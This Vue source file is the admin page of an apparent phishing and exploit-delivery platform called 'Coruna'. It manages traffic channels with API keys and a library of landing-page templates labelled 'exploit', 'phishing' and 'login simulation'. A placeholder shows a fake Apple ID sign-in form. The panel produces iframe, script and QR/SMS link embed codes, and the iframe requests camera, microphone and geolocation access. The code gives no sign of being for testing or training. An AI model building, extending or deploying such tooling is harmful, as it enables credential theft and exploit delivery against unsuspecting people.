<template>
  <div class="channels-page">
    <div class="page-card">
      <div class="page-header">
        <div>
          <div class="page-title">渠道管理</div>
          <div class="page-subtitle">管理流量接入渠道，每个渠道拥有独立的 API Key 和嵌入代码</div>
        </div>
        <div style="display:flex;gap:8px;">
          <el-button type="success" plain @click="openTemplates">
            <el-icon><Collection /></el-icon>
            <span>模板管理</span>
          </el-button>
          <el-button type="primary" @click="openCreate">
            <el-icon><Plus /></el-icon>
            <span>新建渠道</span>
          </el-button>
        </div>
      </div>

      <div class="search-bar">
        <el-input v-model="filters.q" placeholder="搜索 Slug / 名称" clearable style="width:260px;" @clear="loadList" @keyup.enter="loadList">
          <template #prefix><el-icon><Search /></el-icon></template>
        </el-input>
        <el-select v-model="filters.enabled" placeholder="状态" clearable style="width:140px;" @change="loadList">
          <el-option label="全部" value="" />
          <el-option label="启用" :value="true" />
          <el-option label="禁用" :value="false" />
        </el-select>
        <el-button type="primary" @click="loadList">搜索</el-button>
      </div>

      <el-table :data="list" stripe>
        <el-table-column prop="slug" label="Slug" width="140">
          <template #default="{ row }"><span class="mono">{{ row.slug }}</span></template>
        </el-table-column>
        <el-table-column label="颜色" width="80">
          <template #default="{ row }">
            <span class="color-dot" :style="{ background: row.color || '#409eff' }" />
            <span>{{ row.color }}</span>
          </template>
        </el-table-column>
        <el-table-column prop="name" label="渠道名称" width="150" />
        <el-table-column label="API Key" width="260">
          <template #default="{ row }">
            <span class="mono text-muted">{{ maskKey(row.api_key) }}</span>
            <el-button link type="primary" size="small" @click="copyText(row.api_key)">复制</el-button>
          </template>
        </el-table-column>
        <el-table-column label="默认模板" width="140">
          <template #default="{ row }">
            <el-tag v-if="row.default_template_name" size="small" type="info">{{ row.default_template_name }}</el-tag>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="visit_count" label="访问量" width="100" sortable>
          <template #default="{ row }">{{ (row.visit_count || 0).toLocaleString() }}</template>
        </el-table-column>
        <el-table-column prop="device_count" label="设备数" width="90" sortable>
          <template #default="{ row }">{{ row.device_count || 0 }}</template>
        </el-table-column>
        <el-table-column label="状态" width="80">
          <template #default="{ row }">
            <el-tag :type="row.enabled ? 'success' : 'info'" size="small" effect="plain">
              {{ row.enabled ? '启用' : '禁用' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="domain_whitelist" label="域名白名单" width="180">
          <template #default="{ row }">
            <span v-if="!row.domain_whitelist" class="text-muted">-</span>
            <template v-else>
              <el-tag size="small" effect="plain" v-for="d in parseDomains(row.domain_whitelist).slice(0,2)" :key="d" style="margin-right:4px;">
                {{ d }}
              </el-tag>
              <span v-if="parseDomains(row.domain_whitelist).length > 2" class="text-muted">+{{ parseDomains(row.domain_whitelist).length - 2 }}</span>
            </template>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="320" fixed="right">
          <template #default="{ row }">
            <el-button type="primary" link size="small" @click="openEdit(row)">编辑</el-button>
            <el-button type="warning" link size="small" @click="copyEmbed(row)">嵌入代码</el-button>
            <el-button type="success" link size="small" @click="resetKey(row)">重置 Key</el-button>
            <el-button :type="row.enabled ? 'info' : 'warning'" link size="small" @click="toggleEnabled(row)">
              {{ row.enabled ? '禁用' : '启用' }}
            </el-button>
            <el-button type="danger" link size="small" @click="deleteRow(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        v-model:current-page="page"
        v-model:page-size="pageSize"
        :page-sizes="[20, 50, 100]"
        :total="total"
        layout="total, sizes, prev, pager, next"
        background
        style="justify-content:flex-end;margin-top:16px;"
        @current-change="loadList"
        @size-change="loadList"
      />
    </div>

    <el-dialog v-model="dialogVisible" :title="form.id ? '编辑渠道' : '新建渠道'" width="580px">
      <el-form :model="form" :rules="rules" ref="formRef" label-width="110px">
        <el-form-item label="Slug" prop="slug">
          <el-input v-model="form.slug" placeholder="英文标识，如 wechat_01" :disabled="!!form.id" />
        </el-form-item>
        <el-form-item label="名称" prop="name">
          <el-input v-model="form.name" placeholder="渠道名称，如 微信投放-1号" />
        </el-form-item>
        <el-form-item label="颜色" prop="color">
          <el-color-picker v-model="form.color" />
          <span class="text-muted" style="margin-left:8px;">用于数据区分显示</span>
        </el-form-item>
        <el-form-item label="默认模板" prop="default_template_id">
          <el-select v-model="form.default_template_id" clearable placeholder="选择默认落地页模板" style="width:100%;">
            <el-option-group v-for="(group, gk) in templateGroups" :key="gk" :label="group.label">
              <el-option v-for="t in group.items" :key="t.id" :label="`${t.name} (${t.slug})`" :value="t.id" />
            </el-option-group>
          </el-select>
          <div style="margin-top:6px;">
            <el-button size="small" type="primary" link @click="openTemplates">管理/新增模板 →</el-button>
          </div>
        </el-form-item>
        <el-form-item label="启用状态">
          <el-switch v-model="form.enabled" active-text="启用" inactive-text="禁用" />
        </el-form-item>
        <el-form-item label="域名白名单">
          <el-select
            v-model="form._domains"
            multiple
            filterable
            allow-create
            default-first-option
            placeholder="输入域名后回车添加，如 example.com"
            style="width:100%;"
          />
          <div class="text-muted" style="font-size:12px;margin-top:4px;">
            留空表示允许所有域名；建议填写投放页面的真实域名以限制渠道使用范围
          </div>
        </el-form-item>
        <el-form-item label="备注">
          <el-input v-model="form.note" type="textarea" :rows="2" placeholder="备注说明，可选" />
        </el-form-item>
        <el-form-item v-if="requireOtp" label="2FA 验证码" prop="otp_code">
          <el-input v-model="form.otp_code" placeholder="输入 Google Authenticator 6位数字" maxlength="6" style="width:220px;" />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="submitting" @click="submitForm">确定</el-button>
      </template>
    </el-dialog>

    <el-dialog v-model="embedVisible" title="嵌入代码" width="740px">
      <div style="margin-bottom:14px;">
        <div class="text-muted" style="margin-bottom:10px;">
          渠道：<el-tag type="success" effect="plain">{{ currentRow?.name }}</el-tag>
          <span class="mono text-muted" style="margin-left:10px;">slug: {{ currentRow?.slug }}</span>
        </div>
        <el-radio-group v-model="embedMode" style="margin-bottom:10px;">
          <el-radio-button value="iframe">
            <el-icon><Monitor /></el-icon>
            <span style="margin-left:4px;">iframe 嵌入</span>
          </el-radio-button>
          <el-radio-button value="script">
            <el-icon><Document /></el-icon>
            <span style="margin-left:4px;">Script 脚本</span>
          </el-radio-button>
          <el-radio-button value="link">
            <el-icon><Link /></el-icon>
            <span style="margin-left:4px;">链接跳转</span>
          </el-radio-button>
        </el-radio-group>
        <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
          <el-select v-model="embedTplId" clearable placeholder="选择落地页模板（可选）" style="width:280px;">
            <el-option label="使用渠道默认模板" value="" />
            <el-option v-for="t in templates" :key="t.id" :label="`${t.name} (${t.slug})`" :value="t.id" />
          </el-select>
          <el-input v-model="publicBaseUrl" placeholder="投放域名（如 https://example.com，留空使用当前域名）" style="width:320px;" clearable />
          <el-button type="primary" size="small" @click="genEmbed">生成代码</el-button>
        </div>
      </div>
      <div class="text-muted" style="margin-bottom:8px;" v-if="embedMode === 'iframe'">
        将以下代码粘贴到您的落地页需要显示的位置：
      </div>
      <div class="text-muted" style="margin-bottom:8px;" v-else-if="embedMode === 'script'">
        将以下代码粘贴到您的落地页 <code>&lt;/body&gt;</code> 标签之前：
      </div>
      <div class="text-muted" style="margin-bottom:8px;" v-else>
        将以下链接用于投放跳转或二维码：
      </div>
      <el-input v-model="embedCode" type="textarea" :rows="embedMode === 'link' ? 2 : 8" readonly class="mono" />
      <div style="margin-top:10px;" v-if="embedMode !== 'link'">
        <div class="text-muted" style="font-size:12px;">
          💡 <strong>iframe</strong>：适合直接嵌入到现有页面容器中，完全隔离样式<br/>
          💡 <strong>Script</strong>：适合在页面底部异步加载，自动创建悬浮层或全屏容器<br/>
          💡 <strong>Link</strong>：适合二维码、短信、社交媒体等场景，直接跳转到落地页
        </div>
      </div>
      <template #footer>
        <el-button @click="previewEmbed" size="small" type="success" plain>
          <el-icon><View /></el-icon>
          <span>预览页面</span>
        </el-button>
        <el-button @click="embedVisible = false">关闭</el-button>
        <el-button type="primary" @click="copyEmbedCode">一键复制</el-button>
      </template>
    </el-dialog>

    <el-dialog v-model="tplDialogVisible" title="模板管理" width="820px" top="6vh">
      <div style="margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;">
        <div>
          <el-input v-model="tplFilter.q" placeholder="搜索模板名称/Slug" clearable style="width:240px;margin-right:8px;" @clear="loadTemplates" @keyup.enter="loadTemplates">
            <template #prefix><el-icon><Search /></el-icon></template>
          </el-input>
          <el-select v-model="tplFilter.category" placeholder="分类" clearable style="width:140px;margin-right:8px;" @change="loadTemplates">
            <el-option label="全部" :value="null" />
            <el-option label="漏洞利用" value="exploit" />
            <el-option label="钓鱼页面" value="phishing" />
            <el-option label="通用" value="generic" />
            <el-option label="登录模拟" value="login" />
          </el-select>
          <el-button size="small" type="primary" @click="loadTemplates">查询</el-button>
        </div>
        <div style="display:flex;gap:8px;">
          <el-button size="small" type="success" plain @click="seedTemplates">
            <el-icon><MagicStick /></el-icon>
            <span>加载默认模板</span>
          </el-button>
          <el-button size="small" type="primary" @click="openTplCreate">
            <el-icon><Plus /></el-icon>
            <span>新增模板</span>
          </el-button>
        </div>
      </div>
      <el-table :data="tplList" stripe size="small" max-height="480">
        <el-table-column prop="slug" label="Slug" width="140">
          <template #default="{ row }"><span class="mono">{{ row.slug }}</span></template>
        </el-table-column>
        <el-table-column prop="name" label="模板名称" width="160" />
        <el-table-column label="分类" width="100">
          <template #default="{ row }">
            <el-tag :type="tplCatType(row.category)" size="small" effect="plain">{{ tplCatLabel(row.category) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="title" label="页面标题" show-overflow-tooltip />
        <el-table-column prop="visit_count" label="访问量" width="80" align="right">
          <template #default="{ row }">{{ (row.visit_count || 0).toLocaleString() }}</template>
        </el-table-column>
        <el-table-column prop="device_count" label="设备数" width="80" align="right">
          <template #default="{ row }">{{ row.device_count || 0 }}</template>
        </el-table-column>
        <el-table-column label="状态" width="70">
          <template #default="{ row }">
            <span class="status-dot status-dot-success" v-if="row.enabled" title="启用"></span>
            <span class="status-dot status-dot-info" v-else title="禁用"></span>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="200" fixed="right">
          <template #default="{ row }">
            <el-button type="success" link size="small" @click="previewTpl(row)">预览</el-button>
            <el-button type="primary" link size="small" @click="openTplEdit(row)">编辑</el-button>
            <el-button type="danger" link size="small" @click="deleteTpl(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-divider />
      <div style="font-weight:600;margin-bottom:8px;">
        <el-icon style="vertical-align:-2px;"><Edit /></el-icon>
        <span style="margin-left:4px;">{{ tplForm.id ? '编辑模板' : '新增模板' }}</span>
      </div>
      <el-form :model="tplForm" :rules="tplRules" ref="tplFormRef" label-width="100px" size="default">
        <div style="display:flex;gap:16px;">
          <el-form-item label="Slug" prop="slug" style="flex:1;">
            <el-input v-model="tplForm.slug" placeholder="英文标识，如 appleid-login" :disabled="!!tplForm.id" />
          </el-form-item>
          <el-form-item label="名称" prop="name" style="flex:1;">
            <el-input v-model="tplForm.name" placeholder="模板名称，如 Apple ID 登录" />
          </el-form-item>
        </div>
        <div style="display:flex;gap:16px;">
          <el-form-item label="分类" prop="category" style="flex:1;">
            <el-select v-model="tplForm.category" style="width:100%;">
              <el-option label="漏洞利用 (exploit)" value="exploit" />
              <el-option label="钓鱼页面 (phishing)" value="phishing" />
              <el-option label="登录模拟 (login)" value="login" />
              <el-option label="通用页面 (generic)" value="generic" />
            </el-select>
          </el-form-item>
          <el-form-item label="页面标题" style="flex:1;">
            <el-input v-model="tplForm.title" placeholder="HTML 标题，如 Sign in to Apple" />
          </el-form-item>
        </div>
        <el-form-item label="启用">
          <el-switch v-model="tplForm.enabled" />
        </el-form-item>
        <el-form-item label="描述">
          <el-input v-model="tplForm.description" type="textarea" :rows="2" placeholder="模板用途说明，可选" />
        </el-form-item>
        <el-form-item label="页面 HTML">
          <el-input
            v-model="tplForm.html_index"
            type="textarea"
            :rows="10"
            placeholder='<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Apple ID 登录</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
  <h1>Sign in to Apple</h1>
  <form id="lf">
    <input name="appleid" placeholder="Apple ID" autocomplete="username">
    <input name="pwd" type="password" placeholder="密码" autocomplete="current-password">
    <button type="submit">继续</button>
  </form>
</body>
</html>'
            class="mono"
          />
          <div class="text-muted" style="font-size:12px;margin-top:4px;">
            完整的 HTML 页面代码，包含 head/body；支持嵌入任意 CSS/JS。留空则使用后端默认框架页。
          </div>
        </el-form-item>
        <el-form-item label="预览图 URL">
          <el-input v-model="tplForm.preview_url" placeholder="https://.../preview.png，可选" clearable />
        </el-form-item>
        <el-form-item v-if="requireOtp" label="2FA 验证码" prop="tpl_otp">
          <el-input v-model="tplForm.tpl_otp" placeholder="输入 6 位验证码" maxlength="6" style="width:220px;" />
        </el-form-item>
        <el-form-item>
          <div style="display:flex;gap:8px;">
            <el-button size="small" @click="resetTplForm">清空</el-button>
            <el-button size="small" type="primary" :loading="tplSubmitting" @click="submitTpl">
              {{ tplForm.id ? '保存修改' : '创建模板' }}
            </el-button>
          </div>
        </el-form-item>
      </el-form>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted, watch } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import {
  Plus, Search, Collection, Monitor, Document, Link, View, MagicStick, Edit
} from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { copyToClipboard, require2FA } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(20)
const filters = reactive({ q: '', enabled: null })
const templates = ref([])

const dialogVisible = ref(false)
const submitting = ref(false)
const formRef = ref(null)
const requireOtp = ref(true)
const form = reactive(defaultForm())
const rules = {
  slug: [{ required: true, message: '请输入 Slug', trigger: 'blur' }],
  name: [{ required: true, message: '请输入渠道名称', trigger: 'blur' }],
  color: [{ required: true, message: '请选择颜色', trigger: 'change' }]
}

const embedVisible = ref(false)
const embedMode = ref('iframe')
const embedCode = ref('')
const embedTplId = ref(null)
const publicBaseUrl = ref('')
const currentRow = ref(null)

const tplDialogVisible = ref(false)
const tplList = ref([])
const tplFilter = reactive({ q: '', category: null })
const tplFormRef = ref(null)
const tplSubmitting = ref(false)
const tplForm = reactive(defaultTplForm())
const tplRules = {
  slug: [{ required: true, message: '请输入 Slug', trigger: 'blur' }],
  name: [{ required: true, message: '请输入模板名称', trigger: 'blur' }],
  category: [{ required: true, message: '请选择分类', trigger: 'change' }],
}

function defaultForm() {
  return {
    id: null, slug: '', name: '', color: '#409eff',
    default_template_id: null, enabled: true,
    _domains: [], note: '', otp_code: ''
  }
}

function defaultTplForm() {
  return {
    id: null, slug: '', name: '', category: 'exploit',
    title: '', description: '', html_index: '', preview_url: '',
    enabled: true, tpl_otp: ''
  }
}

function maskKey(key) {
  if (!key) return ''
  if (key.length <= 12) return key
  return key.slice(0, 6) + '****' + key.slice(-4)
}

function parseDomains(v) {
  if (!v) return []
  if (Array.isArray(v)) return v
  return String(v).split(/[,;|\s]+/).map(s => s.trim()).filter(Boolean)
}

function tplCatLabel(c) {
  return { exploit: '漏洞', phishing: '钓鱼', login: '登录', generic: '通用' }[c] || c || '通用'
}
function tplCatType(c) {
  return { exploit: 'danger', phishing: 'warning', login: 'primary', generic: 'info' }[c] || 'info'
}

const templateGroups = computed(() => {
  const g = {
    exploit: { label: '漏洞利用模板', items: [] },
    phishing: { label: '钓鱼页面模板', items: [] },
    login: { label: '登录模拟模板', items: [] },
    generic: { label: '通用页面模板', items: [] },
  }
  ;(templates.value || []).forEach(t => {
    const key = t.category && g[t.category] ? t.category : 'generic'
    g[key].items.push(t)
  })
  Object.keys(g).forEach(k => {
    if (!g[k].items.length) delete g[k]
  })
  if (!Object.keys(g).length && (templates.value || []).length) {
    g.other = { label: '全部模板', items: templates.value }
  }
  return g
})

function openCreate() {
  Object.assign(form, defaultForm())
  dialogVisible.value = true
}

function openEdit(row) {
  Object.assign(form, {
    ...defaultForm(),
    ...row,
    default_template_id: row.default_template_id || null,
    _domains: parseDomains(row.domain_whitelist),
    note: row.note || row.remark || '',
    enabled: row.enabled !== 0 && row.enabled !== false,
    otp_code: ''
  })
  dialogVisible.value = true
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      search: filters.q || undefined,
      enabled: filters.enabled === '' ? undefined : filters.enabled
    }
    const res = await axios.get('/api/channels', { params })
    list.value = res.data?.items || res.data || []
    total.value = res.data?.total || list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '渠道加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

async function loadTemplates() {
  try {
    const params = {
      skip: 0, limit: 200,
      search: tplFilter.q || undefined,
      category: tplFilter.category || undefined,
    }
    const res = await axios.get('/api/templates', { params })
    const raw = res.data?.items || res.data || []
    templates.value = raw
    tplList.value = raw
    if (!raw.length) seedTemplates(false)
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '模板加载失败'
    ElMessage.error(msg)
    templates.value = []
    tplList.value = []
  }
}

async function submitForm() {
  if (!formRef.value) return
  const valid = await formRef.value.validate().catch(() => false)
  if (!valid) return
  submitting.value = true
  try {
    const otp = await require2FA(form.id ? 'update channel' : 'create channel')
    if (otp === false) { submitting.value = false; return }
    const payload = {
      slug: form.slug, name: form.name, color: form.color,
      default_template_id: form.default_template_id || null,
      enabled: form.enabled,
      domain_whitelist: Array.isArray(form._domains) ? form._domains.join(',') : (form.domain_whitelist || ''),
      note: form.note || '',
    }
    const params = {}
    if (otp) params.otp_code = otp

    if (form.id) {
      await axios.patch(`/api/channels/${form.id}`, payload, { params })
      ElMessage.success('已更新')
    } else {
      await axios.post('/api/channels', payload, { params })
      ElMessage.success('创建成功')
    }
    dialogVisible.value = false
    loadList()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '保存失败'
    ElMessage.error(msg)
  } finally {
    submitting.value = false
  }
}

async function toggleEnabled(row) {
  try {
    const otp = await require2FA(row.enabled ? 'disable channel' : 'enable channel')
    if (otp === false) return
    const payload = { enabled: !row.enabled }
    const params = {}
    if (otp) params.otp_code = otp
    await axios.patch(`/api/channels/${row.id}`, payload, { params })
    ElMessage.success('已更新')
    loadList()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '操作失败'
      ElMessage.error(msg)
    }
  }
}

async function deleteRow(row) {
  try {
    await ElMessageBox.confirm(`确认删除渠道「${row.name}」？相关数据保留但无法接收新流量。`, '删除渠道', { type: 'warning' })
    const otp = await require2FA('delete channel')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/channels/${row.id}`, { params })
    ElMessage.success('已删除')
    loadList()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '删除失败'
      ElMessage.error(msg)
    }
  }
}

async function resetKey(row) {
  try {
    await ElMessageBox.confirm(`确认重置 API Key？旧 Key 立即失效，需要更新嵌入代码。`, '重置 API Key', { type: 'warning' })
    const otp = await require2FA('reset channel api key')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    const res = await axios.post(`/api/channels/${row.id}/rotate-key`, null, { params })
    if (res.data?.api_key) {
      copyToClipboard(res.data.api_key)
      ElMessage.success('已重置并复制新 Key')
    } else {
      ElMessage.success('已重置')
    }
    loadList()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '重置失败'
      ElMessage.error(msg)
    }
  }
}

async function copyEmbed(row) {
  currentRow.value = row
  embedMode.value = 'iframe'
  embedTplId.value = row.default_template_id || null
  if (!publicBaseUrl.value) {
    const origin = window.location.origin.replace(/\/$/, '')
    publicBaseUrl.value = origin.replace(/:\d+$/, ':7070') || 'http://localhost:7070'
  }
  await genEmbed()
  embedVisible.value = true
}

async function genEmbed() {
  if (!currentRow.value) return
  try {
    const params = {
      mode: embedMode.value,
      tpl_slug: null,
      public_base_url: publicBaseUrl.value || undefined,
    }
    if (embedTplId.value && String(embedTplId.value) !== '') {
      const t = (templates.value || []).find(x => x.id === embedTplId.value)
      if (t) params.tpl_slug = t.slug
    }
    const res = await axios.get(`/api/channels/${currentRow.value.id}/embed`, { params })
    embedCode.value = res.data?.code || ''
    if (!embedCode.value) throw new Error('empty')
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '嵌入代码生成失败'
    if (msg !== 'empty') ElMessage.error(msg)
    const base = (publicBaseUrl.value || window.location.origin).replace(/\/$/, '')
    const t = (embedTplId.value && String(embedTplId.value) !== '')
      ? (templates.value || []).find(x => x.id === embedTplId.value)
      : null
    const tplPart = t ? `&tpl=${encodeURIComponent(t.slug)}` : ''
    const url = `${base}/ch/${currentRow.value.slug}?ch=${currentRow.value.slug}${tplPart}`
    if (embedMode.value === 'iframe') {
      embedCode.value = `<iframe src="${url}" width="100%" height="800" frameborder="0" allow="camera;microphone;geolocation"></iframe>`
    } else if (embedMode.value === 'link') {
      embedCode.value = url
    } else {
      const closeTag = '</sc' + 'ript>'
      embedCode.value = `<!-- Coruna 渠道嵌入代码 (${currentRow.value.slug}) -->
<sc${''}ript>
(function () {
  var cfg = {
    ch: '${currentRow.value.slug}',
    k: '${(currentRow.value.api_key || '').slice(0, 12)}...',
    mode: 'float'
  };
  var s = document.createElement('script');
  s.async = true;
  s.src = '${base}/ch/${currentRow.value.slug}/embed.js?ch=${encodeURIComponent(currentRow.value.slug)}${tplPart}';
  s.onload = function () { if (window.CorunaEmbed) window.CorunaEmbed.init(cfg); };
  (document.head || document.body).appendChild(s);
})();
${closeTag}`
    }
  }
}

watch(embedMode, () => { if (embedVisible.value) genEmbed() })
watch(embedTplId, () => { if (embedVisible.value) genEmbed() })

function previewEmbed() {
  if (!currentRow.value) return
  const base = (publicBaseUrl.value || window.location.origin).replace(/\/$/, '')
  const t = (templates.value || []).find(x => x.id === embedTplId.value)
  const tplPart = t ? `&tpl=${encodeURIComponent(t.slug)}` : ''
  const url = `${base}/ch/${currentRow.value.slug}?ch=${currentRow.value.slug}${tplPart}`
  window.open(url, '_blank', 'noopener')
}

async function copyEmbedCode() {
  await copyToClipboard(embedCode.value)
  ElMessage.success('嵌入代码已复制')
}

async function copyText(t) {
  await copyToClipboard(t || '')
  ElMessage.success('已复制')
}

function openTemplates() {
  tplDialogVisible.value = true
  loadTemplates()
}

function resetTplForm() {
  Object.assign(tplForm, defaultTplForm())
  if (tplFormRef.value) tplFormRef.value.resetFields()
}

function openTplCreate() {
  Object.assign(tplForm, defaultTplForm())
  tplForm.category = 'exploit'
}

function openTplEdit(row) {
  Object.assign(tplForm, {
    ...defaultTplForm(),
    ...row,
    enabled: row.enabled !== 0 && row.enabled !== false,
    tpl_otp: ''
  })
}

async function submitTpl() {
  if (!tplFormRef.value) return
  const valid = await tplFormRef.value.validate().catch(() => false)
  if (!valid) return
  tplSubmitting.value = true
  try {
    const otp = await require2FA(tplForm.id ? 'update template' : 'create template')
    if (otp === false) { tplSubmitting.value = false; return }
    const payload = {
      slug: tplForm.slug, name: tplForm.name, category: tplForm.category,
      title: tplForm.title, description: tplForm.description,
      html_index: tplForm.html_index || null,
      preview_url: tplForm.preview_url || null,
      enabled: tplForm.enabled,
    }
    const params = {}
    if (otp) params.otp_code = otp

    if (tplForm.id) {
      await axios.patch(`/api/templates/${tplForm.id}`, payload, { params })
      ElMessage.success('模板已更新')
    } else {
      await axios.post('/api/templates', payload, { params })
      ElMessage.success('模板创建成功')
    }
    resetTplForm()
    loadTemplates()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '保存失败'
    ElMessage.error(msg)
  } finally {
    tplSubmitting.value = false
  }
}

async function deleteTpl(row) {
  try {
    await ElMessageBox.confirm(`确认删除模板「${row.name}」？关联渠道的默认模板将被清空。`, '删除模板', { type: 'warning' })
    const otp = await require2FA('delete template')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/templates/${row.id}`, { params })
    ElMessage.success('已删除')
    loadTemplates()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '删除失败'
      ElMessage.error(msg)
    }
  }
}

function previewTpl(row) {
  try {
    const base = window.location.origin.replace(/\/$/, '')
    window.open(`${base}/api/templates/${row.id}/preview`, '_blank', 'noopener')
  } catch (err) {
    ElMessage.info('预览功能需要后端服务支持')
  }
}

async function seedTemplates(force = true) {
  try {
    const res = await axios.post('/api/templates/seed', null, { params: { force } })
    ElMessage.success(res.data?.message || '已加载默认模板')
    loadTemplates()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '加载默认模板失败'
    ElMessage.error(msg)
    loadTemplates()
  }
}

onMounted(() => {
  loadList()
  loadTemplates()
})
</script>

<style scoped>
.channels-page { width: 100%; }
.color-dot {
  display: inline-block;
  width: 14px;
  height: 14px;
  border-radius: 50%;
  margin-right: 6px;
  border: 1px solid rgba(0, 0, 0, 0.1);
  vertical-align: middle;
}
.status-dot {
  display: inline-block;
  width: 10px;
  height: 10px;
  border-radius: 50%;
  vertical-align: middle;
}
.status-dot-success {
  background: #67c23a;
  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.18);
}
.status-dot-info {
  background: #909399;
  box-shadow: 0 0 0 2px rgba(144, 147, 153, 0.18);
}
.mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
.text-muted { color: #909399; }
</style>
